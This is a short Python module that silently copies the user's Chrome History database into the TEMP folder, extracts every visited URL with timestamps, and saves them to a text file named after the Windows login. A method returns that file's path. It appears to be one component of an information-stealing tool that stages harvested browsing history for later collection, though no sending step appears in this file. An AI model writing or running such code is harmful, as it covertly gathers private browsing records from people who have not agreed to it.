from .imports import *

class GHManagement:
    def __init__(self) -> None:
        self.temp = os.getenv("TEMP")
        dbfile = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                        "Google", "Chrome", "User Data", "default", "History")
        filename = f"{self.temp}\\History.db"
        shutil.copy(dbfile, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT * from urls")
        browsing_data = (cursor.fetchall())
        hispath = f"{self.temp}\\{os.getlogin()}-CH.txt"
        if os.path.exists(hispath):
            os.remove(hispath)
        with open(hispath, "a")as ddd:
            for record in browsing_data:
                visit_time = str(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=record[5]))
                if visit_time[:4] == "1601":
                    pass
                else:
                    visit_time = str(datetime.datetime.strptime(visit_time, "%Y-%m-%d %H:%M:%S.%f"))
                    visit_time = visit_time[:-7]
                visit_url = record[1]
                visit_line = f"{visit_time}: Website Visited: {visit_url}\n"
                ddd.write(str(visit_line))
        try:
            os.remove(filename)
        except:
            pass
            
    def __repr__(self) -> str:
        return "GHManagement()"
            
    def Val(self) -> str:
        return f"{self.temp}\\{os.getlogin()}-CH.txt"